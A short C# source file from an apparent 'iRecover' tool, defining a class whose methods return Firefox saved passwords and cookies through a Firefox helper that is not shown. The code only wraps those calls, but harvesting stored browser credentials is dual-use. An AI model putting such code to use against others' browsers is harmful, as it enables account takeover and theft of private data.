using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace iRecover
{
    public static class Browsers
    {
        public static List<FirefoxPassword> FireFoxPassword()
        {
            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
            return firefoxPasswords;
        }

        public static List<FirefoxCookie> FireFoxCookies()
        {
            List<FirefoxCookie> firefoxCookies = Firefox.Cookies();
            return firefoxCookies;
        }
    }
}

